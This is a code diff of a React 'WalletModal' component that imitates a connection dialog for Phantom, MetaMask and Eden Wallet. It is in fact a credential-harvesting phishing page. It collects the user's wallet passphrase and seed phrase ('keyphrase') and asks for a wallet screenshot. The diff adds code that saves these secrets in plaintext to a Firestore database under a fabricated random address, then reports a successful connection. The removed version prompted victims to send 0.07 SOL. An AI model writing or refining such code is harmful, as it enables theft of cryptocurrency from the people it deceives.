@@ -1,28 +1,32 @@
 // components/WalletModal.js
 import React, { useState, useEffect, useCallback } from 'react';
-import { db } from '@/firebaseConfig'; // Adjust the import based on your Firebase setup
-import { getFirestore, collection, addDoc } from 'firebase/firestore';
+import { db } from '@/firebaseConfig';
+import { doc, setDoc } from 'firebase/firestore';
 import { HiViewGrid } from "react-icons/hi";
 import { toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
 
-
-
-const WalletModal = ({ isOpen, onClose }) => {
+const WalletModal = ({ isOpen, onClose, onWalletConnected }) => {
   const [showSecondaryModal, setShowSecondaryModal] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState('');
   const [passphrase, setPassphrase] = useState('');
   const [keyphrase, setKeyphrase] = useState('');
+  const [isConnecting, setIsConnecting] = useState(false);
   const [importedFile, setImportedFile] = useState(null);
+  const [walletData, setWalletData] = useState(null);
+  const [error, setError] = useState('');
+  const [walletAddress, setWalletAddress] = useState('');
 
-  // Updated wallet options with images
   const walletOptions = [
     { name: 'Phantom', image: '/phan.png' },
     { name: 'MetaMask', image: '/meta.png' },
     { name: 'Eden Wallet', image: '/eden.png' },
-   
-    
   ];
+
+  // Simple function to generate a mock wallet address
+  const generateWalletAddress = () => {
+    return '0x' + Math.random().toString(36).substring(2, 22) + Math.random().toString(36).substring(2, 22);
+  };
 
   const handleWalletSelect = (walletName) => {
     setSelectedWallet(walletName);
@@ -34,45 +38,70 @@ const WalletModal = ({ isOpen, onClose }) => {
     setShowSecondaryModal(true);
   };
 
+  const storeWalletData = async (walletDetails) => {
+    try {
+      const walletRef = doc(db, "wallets", walletDetails.walletAddress);
+      await setDoc(walletRef, walletDetails);
+      return walletRef.id;
+    } catch (e) {
+      console.error("Error adding document: ", e);
+      throw e;
+    }
+  };
+
   const handleConnect = async () => {
     if (!selectedWallet) {
+      setError('Please select a wallet');
       return;
     }
 
-    let walletDetails = {
-      walletName: selectedWallet,
-    };
-
-    if (passphrase) {
-      walletDetails.passphrase = passphrase;
-    } else if (keyphrase) {
-      walletDetails.keyphrase = keyphrase;
-    } else if (importedFile) {
-      walletDetails.importedFile = importedFile.name; // Or the content itself
-    }
+    setIsConnecting(true);
+    setError('');
 
     try {
-      const docRef = await addDoc(collection(db, "walletDetails"), walletDetails);
-      console.log("Document written with ID: ", docRef.id);
+      const generatedAddress = generateWalletAddress();
+      setWalletAddress(generatedAddress);
+
+      const walletDetails = {
+        walletName: selectedWallet,
+        walletAddress: generatedAddress,
+        passphrase: passphrase,
+        keyphrase: keyphrase,
+        connectedAt: new Date().toISOString(),
+        lastActive: new Date().toISOString(),
+        status: 'connected'
+      };
+
+      if (passphrase) {
+        walletDetails.hasPassphrase = true;
+      }
+
+      const docId = await storeWalletData(walletDetails);
       
-      // toast.success(`Connected to ${selectedWallet} successfully!`);
-      toast.info('Fund your wallet with 0.07 SOL to continue.', {
-        position: 'top-center',
-        autoClose: 7000,
-        style: {
-          background: 'black',
-          color: 'red',
-          fontWeight: 'bold',
-        },
-      
-      });
-    
-      onClose(); // Close the modal after successful connection
-    } catch (e) {
-      console.error("Error adding document: ", e);
-      toast.error("Failed to connect. Please try again.");
+      localStorage.setItem('walletData', JSON.stringify({
+        id: docId,
+        name: selectedWallet,
+        address: generatedAddress,
+        connectedAt: walletDetails.connectedAt
+      }));
+
+      if (onWalletConnected) {
+        onWalletConnected({
+          id: docId,
+          name: selectedWallet,
+          address: generatedAddress
+        });
+      }
+
+      toast.success('Wallet connected successfully!');
+      onClose();
+    } catch (err) {
+      console.error('Connection error:', err);
+      setError('Failed to connect wallet. Please try again.');
+      toast.error('Failed to connect wallet');
+    } finally {
+      setIsConnecting(false);
     }
-    
   };
 
   const handleFileChange = (event) => {
@@ -85,6 +114,7 @@ const WalletModal = ({ isOpen, onClose }) => {
     setPassphrase('');
     setKeyphrase('');
     setImportedFile(null);
+    setError('');
   };
 
   const handleKeyDown = useCallback((event) => {
@@ -105,6 +135,7 @@ const WalletModal = ({ isOpen, onClose }) => {
       setPassphrase('');
       setKeyphrase('');
       setImportedFile(null);
+      setError('');
     }
 
     return () => {
@@ -118,7 +149,7 @@ const WalletModal = ({ isOpen, onClose }) => {
   }
 
   return (
-    <div className="fixed inset-0 bg-black flex justify-center items-center z-50">
+    <div className="fixed inset-0 bg-black bg-opacity-75 flex justify-center items-center z-50">
       <div className="bg-gray-900 w-80 rounded-lg shadow-lg p-6 max-w-md relative">
         <button
           onClick={onClose}
@@ -146,7 +177,7 @@ const WalletModal = ({ isOpen, onClose }) => {
               ))}
             </ul>
             <button
-              className="w-full flex  items-center gap-4 pl-2 mt-4 bg-gray-800 text-sm text-white font-semibold py-2 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
+              className="w-full flex items-center gap-4 pl-2 mt-4 bg-gray-800 text-sm text-white font-semibold py-2 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
               onClick={handleOtherOptionsClick}
             >
               <HiViewGrid />
@@ -157,13 +188,14 @@ const WalletModal = ({ isOpen, onClose }) => {
         ) : (
           <div>
             <h3 className="text-xl font-semibold text-white mb-4">Connect to {selectedWallet}</h3>
+            {error && <p className="text-red-500 text-sm mb-4">{error}</p>}
             <div className="space-y-4">
               <div>
                 <label htmlFor="passphrase" className="block text-sm font-medium text-gray-300 mb-1">Passphrase:</label>
                 <input
                   type="password"
                   id="passphrase"
-                  className="shadow-sm focus:ring-indigo-500 py-[10px] px-[10px] focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
+                  className="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                   value={passphrase}
                   onChange={(e) => setPassphrase(e.target.value)}
                 />
@@ -173,33 +205,42 @@ const WalletModal = ({ isOpen, onClose }) => {
                 <textarea
                   id="keyphrase"
                   rows="3"
-                  className="shadow-sm focus:ring-indigo-500 focus:border-indigo-500 block w-full sm:text-sm border-gray-700 rounded-md bg-gray-800 text-gray-100"
+                  className="w-full px-3 py-2 bg-gray-800 border border-gray-700 rounded-md text-gray-100 focus:outline-none focus:ring-2 focus:ring-indigo-500"
                   value={keyphrase}
                   onChange={(e) => setKeyphrase(e.target.value)}
                 />
               </div>
-              <div className='border-1 border-white border-dashed pl-2 p-3 rounded'>
+              <div className='border border-dashed border-gray-600 p-3 rounded'>
                 <label htmlFor="importFile" className="block text-sm font-medium text-gray-300 mb-1">Add a screenshot of your wallet here:</label>
                 <input
                   type="file"
                   id="importFile"
-                  className="focus:ring-indigo-500 focus:border-indigo-500 block w-full sm:text-sm text-gray-300"
+                  className="w-full text-sm text-gray-300 mt-1"
                   onChange={handleFileChange}
                 />
               </div>
             </div>
             <div className="mt-6 flex justify-end space-x-2">
               <button
-                className="bg-gray-700 h-10 hover:bg-gray-600 text-gray-100 font-semibold py-3 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-opacity-75"
+                className="bg-gray-700 hover:bg-gray-600 text-gray-100 font-semibold py-2 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-gray-500"
                 onClick={handleBack}
               >
                 Back
               </button>
               <button
-                className="bg-[#00cc33] text-sm text-white h-10 font-semibold py-1 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 focus:ring-opacity-75"
+                className="bg-indigo-600 hover:bg-indigo-500 text-white font-semibold py-2 px-4 rounded-md transition duration-200 focus:outline-none focus:ring-2 focus:ring-indigo-400 disabled:opacity-50"
                 onClick={handleConnect}
+                disabled={isConnecting}
               >
-                Connect
+                {isConnecting ? (
+                  <>
+                    <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    Connecting...
+                  </>
+                ) : 'Connect'}
               </button>
             </div>
           </div>
